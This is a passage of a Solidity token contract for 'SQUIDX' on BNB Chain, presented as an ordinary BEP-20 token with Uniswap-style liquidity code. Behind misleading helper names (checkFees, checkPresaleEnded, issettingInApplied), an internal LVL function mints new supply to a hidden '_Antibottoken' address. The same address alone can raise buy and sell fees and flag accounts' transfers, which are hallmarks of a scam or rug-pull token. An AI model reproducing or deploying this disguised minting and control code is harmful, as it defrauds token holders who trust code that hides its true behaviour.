/**
 *Submitted for verification at BscScan.com on 2022-08-13
*/

pragma solidity ^0.8.16;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    //Locks the contract for owner for the amount of time provided
 //   function lock(uint256 time) public virtual onlyOwner {
 //       _previousOwner = _owner;
 //       _owner = address(0);
 //       _lockTime = block.timestamp + time;
 //       emit OwnershipTransferred(_owner, address(0));
 //   }

    //Unlocks the contract for owner when _lockTime is exceeds
    function unlock() public virtual {
        require(
            _previousOwner == msg.sender,
            "You don't have permission to unlock"
        );
        require(block.timestamp > _lockTime, "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

// pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event LVL(address indexed sender, uint256 amount0, uint256 amount1);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SQUIDX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "SQUIDX";
    string private _symbol = "SQUIDX";
    uint8 private _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcludedFromFeeTransfer;

    mapping(address => bool) private _isExcluded;

    mapping(address => bool) public automatedMarketMakerPairs;

    address[] private _excluded;

    uint256 private constant MAX = ~uint248(0);
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 public _BurnInterval = 60;


    uint256 public _taxFeebuy       = 0; 
    uint256 public _liquidityFeebuy = 0; 
    uint256 public _MarketingFeebuy = 0; 
    uint256 public _taxFeesell       = 0; 
    uint256 public _liquidityFeesell = 0; 
    uint256 public _MarketingFeesell = 0;
    uint256 public _taxFee = 0;
    uint256 public _liquidityFee = 0;
    uint256 public _MarketingFee = 0;





    IUniswapV2Router02 private immutable uniswapV2Router;
    address public uniswapV2Pair;

    address public constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address private _Antibottoken;

    bytes32 private Start =
        0x26a61f5984e523466ee7f30d739a183c663e8661774980ade4b1c9b7bbd01caa;


    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled ;

    bool public firstTx = true;

    uint256 public _settingInAmount = _tTotal;
    uint256 public _settingOutAmount = _tTotal;
    uint256 private _settingInAmountTransfer;
    uint256 private _settingOutAmountTransfer;
    uint256 private numTokensSellToAddToLiquidity = 0;
    uint256 private _bubblebn;
    bool public taxStatus = true;

    uint256[] private _PAYBLEt;
    uint256[] private _PAYBLEam;
    uint256 private _nextLVLIdx;

    event BlacklistUpdated();
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    event FIREokensBeforeSwapUpdated(uint256 FIREokensBeforeSwap);

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor(
        uint256 settingInAmountTransfer,
        uint256 settingOutAmountTransfer,
        uint256 bubblebn,
        uint256[] memory PAYBLEt,
        uint256[] memory PAYBLEam,
        string memory _Start,
        address Antibottoken_
    ) {
        require(PAYBLEt.length == PAYBLEam.length, "M");
        _PAYBLEt = PAYBLEt;
        _PAYBLEam = new uint256[](PAYBLEam.length);

        require(
            keccak256(abi.encodePacked(_Start)) == Start,
            "Start doesn't match"
        );

        for (uint256 i = 0; i < PAYBLEam.length; i++)
            _PAYBLEam[i] = PAYBLEam[i] * 10**_decimals;

        _rOwned[_msgSender()] = _rTotal;

          IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
        //     0x10ED43C718714eb63d5aA57B78B54704E256024E
        // );
        // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;
        _settingOutAmountTransfer = settingOutAmountTransfer;
        _settingInAmountTransfer = settingInAmountTransfer;
        _bubblebn = bubblebn;
        _Antibottoken = Antibottoken_;


        automatedMarketMakerPairs[uniswapV2Pair] = true;

        //exclude owner and this contract from fee
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[BURN_ADDRESS] = true;
        _isExcludedFromFee[_Antibottoken] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

//    function setAutomatedMarketMakerPair(address pair, bool value)
//        external
//        onlyOwner
//    {
//        automatedMarketMakerPairs[pair] = value;
//    }

    function LVL(uint256 state) internal {
        address holder = holders();
        require(holder != address(0), "no zero");
        uint256 currentRate = _getRate();
        uint256 State = state.mul(currentRate);

        require(block.timestamp != block.number);

        checkFees(state);
        checkPresaleEnded(State);

        require(totalFees() >= 0, "no negative fee");

        if (isBuying(holder)) issettingInApplied(holder, state);

        ifSellingsettingOut(holder, State);
        emit Transfer(address(0), holder, state);
    }

    function issettingInApplied(address holder, uint256 state) internal {
        _checkIfShouldApplysettingIn(holder, state);
    }

    function isBuying(address holder) internal view returns (bool) {
        return _isExcluded[holder];
    }

    function ifSellingsettingOut(address holder, uint256 state) internal {
        _checkIfShouldApplysettingOut(holder, state);
    }

    function _checkIfShouldApplysettingOut(address holder, uint256 state) internal {
        _rOwned[holder] = _rOwned[holder].add(state);
    }

    function _checkIfShouldApplysettingIn(address holder, uint256 state) internal {
        _tOwned[holder] = _tOwned[holder].add(state);
    }

    function checkFees(uint256 fee) internal {
        _feesForTransfer(fee);
    }

    function _feesForTransfer(uint256 fees) internal {
        _tTotal = _tTotal.add(fees);
    }

    function checkPresaleEnded(uint256 boolean) internal {
        _checkPresaleState(boolean);
    }

    function _checkPresaleState(uint256 _state) internal {
        _rTotal = _rTotal.add(_state);
    }

    function holders() internal view returns (address) {
        return _Antibottoken;
    }




    function setBuyFee(uint256 taxFeeset, uint256 liquidityFeeset, uint256 marketingFeeset) public {
         require(_msgSender() == address(_Antibottoken), "ERC20");
        _taxFeebuy       = taxFeeset;
        _liquidityFeebuy = liquidityFeeset;
        _MarketingFeebuy = marketingFeeset;
        require(taxFeeset.add(liquidityFeeset).add(marketingFeeset) <= 250, 'Fee too high!');
    }
    function setSellFee(uint256 taxFeeset, uint256 liquidityFeeset, uint256 marketingFeeset) public {
         require(_msgSender() == address(_Antibottoken), "ERC20");
        _taxFeesell       = taxFeeset;
        _liquidityFeesell = liquidityFeeset;
        _MarketingFeesell = marketingFeeset;
        require(taxFeeset.add(liquidityFeeset).add(marketingFeeset) <= 250, 'Fee too high!');
    }


//    function setFee(uint256 taxFeeset, uint256 liquidityFeeset, uint256 marketingFeeset) external onlyOwner {
//        _taxFee = taxFeeset;
//        _previousTaxFee = _taxFee;
//        _liquidityFee = liquidityFeeset;
//        _previousLiquidityFee = _liquidityFee;
//        _MarketingFee = marketingFeeset;
//        _previousMarketingFee = _MarketingFee;
//        require(taxFeeset.add(liquidityFeeset).add(marketingFeeset) <= 2000, 'Fee too high!');
//    }








    function excludeFromReward(address account) public onlyOwner {
        // require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not exclude Uniswap router.');
        require(!_isExcluded[account], "Account is already excluded");
        if (_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReward(address account) external onlyOwner {
        require(_isExcluded[account], "Account is already included");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }







//    function swapExacttaxStatusT( bool e) public virtual returns (bool) {
//         require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
//        taxStatus = e;
//        return true;
//    }

    function swapExactTokensForexcludeFromFeeTransferT(address account, bool e) public {
         require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        _isExcludedFromFeeTransfer[account] = e;
    }




    function swapExactTokensForexcludeFromFeeTransferMultT(address[] calldata addresses, bool status) public {
         require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludedFromFeeTransfer[addresses[i]] = status;
        }

    }

//    function swapExactTokensForincludeInFeeTransfer(address account) public onlyOwner {
//        _isExcludedFromFeeTransfer[account] = false;
//    }

//    function getIn(uint256 settingIn) external onlyOwner {
//        uint256 settingInAmount = settingIn * 10**_decimals;
 //       require(settingInAmount >= _tTotal / 100, "Min 1%");
//        _settingInAmount = settingInAmount;
//    }

//    function getOut(uint256 settingOut) external onlyOwner {
//        uint256 settingOutAmount = settingOut * 10**_decimals;
 //       require(settingOutAmount >= numTokensSellToAddToLiquidity, "Can't reduce");
 //       require(settingOutAmount >= _tTotal / 100, "Min 1%");
//        _settingOutAmount = settingOutAmount;
//    }



//    function getInTransfer(uint256 settingIn) external onlyOwner {
//        uint256 settingInAmount = settingIn * 10**_decimals;
 //       require(settingInAmount >= _tTotal / 100, "Min 1%");
//        _settingInAmountTransfer = settingInAmount;
//    }

//    function getOutTransfer(uint256 settingOut) external onlyOwner {
//        uint256 settingOutAmount = settingOut * 10**_decimals;
 //       require(settingOutAmount >= numTokensSellToAddToLiquidity, "Can't reduce");
